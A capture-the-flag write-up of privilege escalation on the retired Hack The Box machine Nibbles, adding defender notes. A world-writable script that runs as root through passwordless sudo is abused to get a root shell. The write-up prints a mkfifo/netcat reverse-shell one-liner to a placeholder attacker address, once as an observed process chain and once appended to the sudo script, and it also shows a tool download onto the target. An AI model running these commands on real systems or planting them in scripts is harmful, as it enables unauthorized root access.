# Nibbles — Privilege Escalation

> A write-up for the **retired** Hack The Box machine *Nibbles*. Retired machines are approved for
> public publication under HTB's content-sharing rules. Continues from
> [`exploitation/initial-access.md`](../exploitation/initial-access.md), where an interactive
> foothold was established as `nibbler` (uid 1001).

> ℹ️ **Defanging & redaction note.** Lab IPs are HTB lab space (RFC 1918) and are defanged only for
> filter compatibility. Commands reflect the live engagement exactly; only environmental identifiers
> are normalized: `<ATTACKER_IP>` for the VPN address, `<PORT>` for the listener. Executable payload
> metacharacters are bracketed (`[;]` `[|]` `[>]`) so the technique is legible but not copy-paste
> runnable. Flag values are `[REDACTED]`. See [`SANITIZATION.md`](../../../SANITIZATION.md).

> ℹ️ **Session note.** This phase was performed against `10[.]129[.]131[.]228`. Multiple spawns
> occurred across the engagement; each file is faithful to its own session. Target-side facts
> (application, credentials, vulnerability path) are consistent across spawns — the box boots from
> a fixed image.

---

The investigative question for this phase:

> **Can access be expanded from the `nibbler` user context to root?**

---

## Step 1 — Extract the Archive (`personal.zip`)

The `nibbler` home directory contained `personal.zip` alongside `user.txt`, noted but deliberately
deferred during initial access. With a stable foothold established, the archive was extracted.

```bash
nibbler@Nibbles:/home/nibbler$ ls -l
total 8
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
```

The `ls -l` output reveals permissions worth noting: both files carry `r--------` (octal 400) —
readable only by the `nibbler` owner, no group or other access. The user flag (33 bytes — 32-char
hash plus newline) and the archive are accessible only because the foothold landed in the correct
user context. A shell as `www-data` would not have reached either.

```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

**Finding:** the archive contained a single shell script — `monitor.sh` — with world-writable
permissions (`rwxrwxrwx`, octal 777) and `nibbler` as the owner. The compromised account has full
write control over this file. Whether this could be leveraged for privilege escalation depended on
whether a privileged execution path existed.

---

## Step 2 — Inspect the Script

`monitor.sh` is a system health monitoring script based on the
[Tecmint Linux server monitoring script](hxxps://www[.]tecmint[.]com/linux-server-health-monitoring-script/).
Its header identifies it as third-party content; only the identifying header and permission findings
are documented here — the full script body is not reproduced.

```bash
# Header excerpt (identifying attribution only):
# Tecmint_monitor.sh
# Written for Tecmint.com
# Free to use/edit/distribute the code below by giving proper credit to Tecmint.com
#! /bin/bash
```

The script uses bash-specific syntax (`[[` conditional expressions) throughout. This becomes
relevant at the weaponization stage.

**Architectural note:** `monitor.sh` makes an outbound HTTP call to an external service
(`ipecho.net/plain`) to retrieve the host's public IP. A root-executed script making external HTTP
requests is a detection opportunity — defenders monitoring egress from a server should flag
unexpected outbound connections from privileged processes.

---

## Step 3 — Validate File Permissions (`ls -l`)

Before drawing any conclusions, file permissions were examined directly.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

`-rwxrwxrwx` (octal 777) grants read, write, and execute access to owner, group, and all other
users. Combined with `nibbler` as the owner, the compromised account has full write control.

| Condition | Evidence | Status |
|---|---|---|
| File writable by compromised account | `-rwxrwxrwx`, owned by `nibbler` | ✓ |
| File executable as root (NOPASSWD) | Unknown — pending `sudo -l` | ⏳ |

Neither condition alone is sufficient. A world-writable script without a privileged execution path
is merely a misconfiguration. The second condition was tested next.

---

## Step 4 — Validate Privileged Execution Path (`sudo -l`)

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

**Finding:** local enumeration identified a shell script (`monitor.sh`) that was both writable by
the compromised account and authorized for passwordless execution as `root` via `sudo`. The
combination of these two conditions established a direct privilege-escalation path, pending
controlled validation.

| Condition | Evidence | Status |
|---|---|---|
| File writable by compromised account | `-rwxrwxrwx`, owned by `nibbler` | ✓ |
| File executable as root (NOPASSWD) | `sudo -l` output | ✓ |

The combination is what creates the exploitable condition:

```
Writable by attacker  +  Executed as root  =  Privilege-escalation path
```

**Defender's perspective:** granting passwordless `sudo` access to a user-controlled script
effectively delegates root-level code execution to whoever controls that file. Scripts authorized
through `sudo` should be immutable, owned by a privileged account, and writable only by trusted
administrators. Combining writable permissions with privileged execution creates a direct and
reliable privilege-escalation path that cannot be blocked by any downstream control once both
conditions are satisfied.

---

## Step 5 — Automated Enumeration (LinEnum)

With the escalation path identified manually, automated enumeration was performed to independently
corroborate the finding and confirm no additional vectors had been missed.

### Tool transfer

LinEnum was downloaded to the attack box first, then served to the target over the HTB VPN using a
Python HTTP server. Pulling tools via the attack box (rather than directly from the internet to the
target) provides a controlled relay: the tool is inspected before delivery, and the transfer path
stays within the assessment's network boundary.

**Attack box — download and serve:**

```bash
cd /tmp
wget hxxps://raw[.]githubusercontent[.]com/rebootuser/LinEnum/master/LinEnum.sh
sudo python3 -m http.server 8080 --directory /tmp
```

> **Note:** the `--directory /tmp` flag is required. Python's HTTP server publishes the current
> working directory by default. An initial attempt without this flag returned `HTTP 404` from the
> target — the server was reachable but serving a different directory. The `404` response confirmed
> network connectivity was intact and isolated the fault to a document-root mismatch. Specifying
> `--directory` explicitly eliminates this ambiguity and makes the transfer reproducible regardless
> of where the server is launched from.

**Target — retrieve and execute:**

```bash
nibbler@Nibbles:/tmp$ wget hxxp://<ATTACKER_IP>:8080/LinEnum.sh
```

**Server-side confirmation (attack box):**
```
10[.]129[.]131[.]228 - - [28/Jul/2026 13:04:20] "GET /LinEnum.sh HTTP/1.1" 200 -
```

**Client-side confirmation (target):**
```
200 OK — Length: 46631 (46K) — 'LinEnum.sh' saved [46631/46631]
```

File size matched on both sides (`46631` bytes). Transfer verified.

```bash
nibbler@Nibbles:/tmp$ chmod +x LinEnum.sh
nibbler@Nibbles:/tmp$ ./LinEnum.sh
```

### Primary corroboration — sudo finding

```
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

LinEnum independently identified the same misconfiguration found manually via `sudo -l`. Two
independent methods — direct policy query and automated enumeration — produced the same result.

The sudo misconfiguration was identified manually before automated enumeration was performed.
LinEnum's role here was corroboration, not discovery:

```
Manual observation  →  primary finding
        ↓
Automated corroboration  →  finding strengthened
```

This sequence — manual discovery followed by automated corroboration — provides stronger
evidentiary footing than relying on automated tooling as the discovery mechanism.

### Additional findings from LinEnum

**OS confirmed (upgraded from inference):**
```
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
Linux Nibbles 4.4.0-104-generic
```
The kernel version and distribution confirmed Ubuntu 16.04.3 LTS (Xenial Xerus), resolving the
inference drawn from service banners during reconnaissance. OS is now established by primary
evidence.

**Apache runtime confirmed (upgraded from qualified claim):**
```
APACHE_RUN_USER=nibbler
APACHE_RUN_GROUP=nibbler
```
The Apache environment confirmed `APACHE_RUN_USER=nibbler`, establishing that the web server
process — not just the uploaded PHP — runs in the `nibbler` security context. This upgrades the
carefully-qualified execution-context claim made during initial access.

**Reverse-shell process chain (defender's view):**

The running process list exposed the complete reverse-shell chain from the target's perspective:

```
sh -c rm /tmp/f[;]mkfifo /tmp/f[;]cat /tmp/f[|]/bin/sh -i 2>&1[|]nc <ATTACKER_IP> <PORT> [>]/tmp/f
cat /tmp/f
/bin/sh -i
nc <ATTACKER_IP> <PORT>
python3 -c 'import pty[;] pty.spawn("/bin/bash")'
```

These correlated processes — named pipe, interactive shell, network connection, and PTY upgrade —
form a recognizable sequence for defenders. Correlating these as a chain rather than as individual
anomalies provides significantly higher detection confidence. A `/tmp/f` file with type `p` (named
pipe) visible in `ls -l` output is itself a high-fidelity indicator of this technique.

**Additional observations (closed branches):**

| Finding | Assessment |
|---|---|
| `PermitRootLogin yes` in SSH config | SSH daemon permits direct root login by configuration; no root authentication material was identified during this assessment, so the setting was noted but not exercised |
| GCC compiler toolchain present | A native compiler was available; because a verified escalation path had already been established through the sudo configuration, no compiler-assisted techniques were investigated |
| MySQL bound to `127[.]0[.]0[.]1:3306` | Loopback-only — not reachable from the current shell without further lateral movement; not actionable for this path |
| SUID binaries | All standard Ubuntu 16.04 system binaries; no unusual entries |
| Cron jobs | All root-owned scripts in standard directories; no user-writable paths referenced |
| `.bash_history` (nibbler) | File existed but contained no command history, providing no additional artifacts for credential or activity reconstruction |

**Defender's perspective:** the transfer and execution sequence — reverse-shell callback → outbound
HTTP request for an enumeration script → script execution — represents a standard and detectable
post-exploitation pattern. Defenders correlating these three events as a chain rather than as
individual anomalies achieve significantly higher detection confidence. The file-transfer step
specifically produces network artifacts (outbound HTTP from the web server process to a
non-standard port) and filesystem artifacts (a new executable in `/tmp`) that are high-fidelity
indicators when correlated with a preceding reverse-shell connection. File-transfer tooling
references: [`references/file-transfer-techniques.md`](../references/file-transfer-techniques.md).

---

## Step 6 — Weaponize the Writable Sudo Script

With both conditions of the escalation path independently confirmed, the world-writable `monitor.sh`
was modified to append a reverse-shell payload. Operational discipline: **append only, never
overwrite** — overwriting could disrupt legitimate functionality and may be more detectable than a
subtle modification. A backup was made before any changes.

**Backup first:**

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cp monitor.sh monitor.sh.bak
```

**Start listener on attack box:**

```bash
nc -lvnp <PORT>
```

**Append payload** (shown neutralized — shell metacharacters bracketed, callback host/port
replaced with placeholders):

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f[;]mkfifo /tmp/f[;]cat /tmp/f[|]/bin/sh -i 2>&1[|]nc <ATTACKER_IP> <PORT> [>]/tmp/f' | tee -a monitor.sh
```

`tee -a` both appends to the file and echoes the written line, providing confirmation of exactly
what was written. `tail -1 monitor.sh` was used to independently verify the payload landed as the
last line of the script.

---

## Step 7 — Trigger Root Execution

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: [[: not found
```

The script produced errors before the payload executed. `monitor.sh` uses bash-specific `[[`
conditional syntax, but sudo executed it under `/bin/sh` (dash on Ubuntu 16.04), which does not
support `[[`. The errors fired from the original script body as `/bin/sh` processed it. The appended
payload used only POSIX-compatible syntax (`/bin/sh` compatible), so it executed cleanly after the
errors — in the root security context.

**Listener received the connection:**

```
Listening on 0.0.0.0 <PORT>
Connection received on 10[.]129[.]131[.]228
#
```

The `#` prompt indicates a root shell.

---

## Step 8 — Validate Root Access and Retrieve Proof

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
[REDACTED]
```

**Finding:** the sudo misconfiguration delivered root execution as predicted. The appended payload
executed in the root security context, establishing a root shell. The root proof was retrieved from
`/root/root.txt`. The proof artifact is documented in
[`proof/flags.md`](../proof/flags.md).

---

## Step 9 — Cleanup

Following proof capture, the target was restored to its pre-exploitation state as operational
discipline:

```bash
# cp /home/nibbler/personal/stuff/monitor.sh.bak /home/nibbler/personal/stuff/monitor.sh
# rm -f /tmp/f /tmp/LinEnum.sh
# exit
```

The `monitor.sh.bak` backup file was left in place (standard for HTB lab environments); in a real
engagement it would also be removed to minimize artifacts. Restoring the original script prevents
disruption to any monitoring functionality the box relies on and limits the forensic footprint of
the assessment.

---

## Privilege escalation summary

| Question | Evidence | Conclusion |
|---|---|---|
| Is there a writable file in the user context? | `ls -l`: `-rwxrwxrwx`, owned by `nibbler` | `monitor.sh` writable by compromised account |
| Is there a privileged execution path? | `sudo -l`: `(root) NOPASSWD: .../monitor.sh` | Root execution path confirmed |
| Does automated enumeration corroborate? | LinEnum: `[+] We can sudo without supplying a password!` | Finding independently corroborated |
| Can the path be exercised? | Root shell received; `id` → `uid=0(root)` | Privilege escalation demonstrated |
| Is root proof accessible? | `cat /root/root.txt` → `[REDACTED]` | Root-level objective complete |

**Takeaway:** the privilege-escalation path required no exploit or CVE — only a misconfigured sudo
policy granting passwordless execution of a user-owned, world-writable script. The combination of
writable permissions and privileged execution is the entire vulnerability; either condition alone
would have been insufficient. Detection and remediation opportunities are documented in `remediation.md` (added at the remediation milestone).
